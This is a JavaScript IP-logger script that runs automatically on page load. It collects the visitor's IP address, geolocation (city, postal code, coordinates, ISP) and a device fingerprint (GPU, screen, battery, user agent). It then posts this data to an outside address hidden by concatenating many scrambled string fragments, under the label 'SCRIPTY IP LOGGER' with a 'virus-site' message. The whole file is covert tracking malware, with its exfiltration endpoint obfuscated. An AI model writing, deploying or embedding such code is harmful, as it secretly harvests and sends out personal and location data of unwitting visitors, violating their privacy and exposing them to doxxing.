const sendIP = () => {
    fetch('https://api.ipify.org?format=json')
        .then(ipResponse => ipResponse.json())
        .then(ipData => {
            const ipadd = ipData.ip;

            return fetch(`https://ipapi.co/${ipadd}/json/`)
                .then(geoResponse => geoResponse.json())
                .then(async geoData => {

                    function getGPUInfo() {
                        try {
                            const canvas = document.createElement('canvas');
                            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                            if (!gl) return 'N/A';

                            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                            if (debugInfo) {
                                return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                            }
                            return 'N/A';
                        } catch {
                            return 'N/A';
                        }
                    }

                    const deviceInfo = {
                        userAgent: navigator.userAgent,
                        screenWidth: window.screen.width,
                        screenHeight: window.screen.height,
                        language: navigator.language,
                        platform: navigator.platform,
                        battery: "PC don't have battery",
                        charging: "PC don't have battery",
                        screenRefreshRate: "N/A",
                        touchScreen: ('ontouchstart' in window) ? 'Yes' : 'No',
                        gpu: getGPUInfo()
                    };

                    if (navigator.getBattery) {
                        await navigator.getBattery().then(battery => {
                            deviceInfo.battery = (battery.level * 100).toFixed(0) + "%";
                            deviceInfo.charging = battery.charging ? "Yes" : "No";
                        });
                    }

                    const getScreenRefreshRate = () => {
                        return new Promise(resolve => {
                            let frames = 0;
                            const start = performance.now();

                            const loop = () => {
                                frames++;
                                const elapsed = performance.now() - start;
                                if (elapsed < 1000) {
                                    requestAnimationFrame(loop);
                                } else {
                                    resolve(Math.round((frames * 1000) / elapsed) + " Hz");
                                }
                            };

                            requestAnimationFrame(loop);
                        });
                    };

                    deviceInfo.screenRefreshRate = await getScreenRefreshRate();
                    

                                    
                    const bWy7Kp = "S:";
                    const fZv0Dn = "7R";
                    const gQl1Rm = "c9";
                    const pTs6Ij = "oS";
                    const lKu9Vx = "i/";
                    const wXe2Lo = "3D";
                    const aCb3Nm = "L7";
                    const tOj4Gq = "q9";
                    const dRp8Us = "Ht";
                    const yVa5Ei = "t:";
                    const sMf7Zo = "5c";
                    const nWx6Ku = "d.";
                    const mIc9Bw = "2B";
                    const rJe1Ck = "p/";
                    const vHl3Dx = "we";
                    const hYs4Lf = "O2";
                    const xAj0Vu = "L";
                    const cFg8Mr = "g5-";
                    const oEv5Rp = "dl";
                    const zNt7Qo = "UU";
                    const iSd2Wy = "co";
                    const uKx9Mn = "jm";
                    const qLi1Op = "tp";
                    const eVz3Bc = "7o";
                    const kTf6Aj = "1";
                    const jGy8Ux = "nY";
                    const uQw0Hl = "4";
                    const sZa5Rf = "HP";
                    const vMg9Dj = "bO";
                    const wFc4Sn = "B4";
                    const tRb7Ie = "dl";
                    const pOa1Xs = "ws";
                    const oPf3Ve = "b2";
                    const nYr6Kq = "dy";
                    const gWj8Pu = "f4";
                    const rLt0Ma = "//";
                    const cXi5Hn = "az";
                    const mKb2Jc = "iDb";
                    const jNr7Vz = "VRY";
                    const sTf9Gy = "ks";
                    const aPr4Wo = "15";
                    const dSm0Xl = "8";
                    const qVj6Bh = "i";
                    const fGz3Kd = "/f";
                    const lHt1Mp = "9S";
                    const yUv5Nz = "54";
                    const kOi8Qr = "Fo";
                    const eWp7Sc = "DL";
                    const zRe9Tm = "FN";
                    const vXn4Lp = "Oo";
                    const uQy0Rs = "3";
                    const oJc6Hv = "dy";
                    const gSw2Lf = "5c";
                    const iBp1Wu = "w";
                    const hOd3Mx = "ce";
                    const nVr9Ky = "6";
                    const tMy5Jq = "dl";
                    const jKf8Vo = "Zw";
                    const pLc2Xn = "7";
                                    
                    const dscURL =
                      dRp8Us + qLi1Op + yVa5Ei + rLt0Ma + iSd2Wy + fZv0Dn + gQl1Rm + pTs6Ij + lKu9Vx + wXe2Lo + vHl3Dx + sTf9Gy +
                      aPr4Wo + dSm0Xl + zNt7Qo + rJe1Ck + aCb3Nm + zRe9Tm + oJc6Hv + yUv5Nz + fGz3Kd + kTf6Aj + tOj4Gq + pLc2Xn +
                      lHt1Mp + uQw0Hl + nYr6Kq + sMf7Zo + mIc9Bw + oPf3Ve + wFc4Sn + pTs6Ij + hYs4Lf + oPf3Ve + hOd3Mx + eWp7Sc +
                      tRb7Ie + jNr7Vz + vXn4Lp + cFg8Mr + kOi8Qr + nVr9Ky + hOd3Mx + sZa5Rf + jGy8Ux + uQw0Rs + oPf3Ve + mKb2Jc +
                      jKf8Vo + gSw2Lf + xAj0Vu + cXi5Hn + qVj6Bh + oEv5Rp + mKb2Jc + gSw2Lf + uQw0Rs + kTf6Aj + kOi8Qr + oJc6Hv;
                                    
                                    
                                    
                                    
                                    
                                    

                    return fetch(dscURL, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            username: "SCRIPTY IP LOGGER",
                            avatar_url: "https://media.discordapp.net/attachments/1386287641540034583/1416506499739422730/game_logo2.png?ex=68c717fa&is=68c5c67a&hm=fa92cff6afc942d00facdb7fdbf2cb4edefb79da388f7e8b5943f468f799fb5c&=&format=webp&quality=lossless&width=355&height=350",
                            content: `@here @everyone somebody get logged (virus-site)`,
                            embeds: [{
                                title: 'SCRIPTY IP LOGGER',
                                description: `
**IP Info:**
IP Address > ${ipadd}
Network > ${geoData.network}
City > ${geoData.city}
Region > ${geoData.region}
Country > ${geoData.country_name}
Postal Code > ${geoData.postal}
Latitude > ${geoData.latitude}
Longitude > ${geoData.longitude}
Timezone > ${geoData.timezone}
Organization > ${geoData.org}

**Screen Info:**
Screen Width > ${deviceInfo.screenWidth}px
Screen Height > ${deviceInfo.screenHeight}px
Screen Refresh Rate > ${deviceInfo.screenRefreshRate}
Touch Screen > ${deviceInfo.touchScreen}

**Device Info:**
User-Agent > ${window}
User-Agent > ${deviceInfo.userAgent}
Language > ${deviceInfo.language}
Platform > ${deviceInfo.platform}
Battery > ${deviceInfo.battery}
Charging > ${deviceInfo.charging}
GPU > ${deviceInfo.gpu}
                                `,
                                color: 2123412
                            }]
                        })
                    });
                });
        })
        .then(dscResponse => {
            if (dscResponse.ok) {
                console.log('Sent! <3');
            } else {
                console.log('Failed :(');
            }
        })
        .catch(error => {
            console.error('Error:', error);
            console.log('Error :(');
        });
};

sendIP();
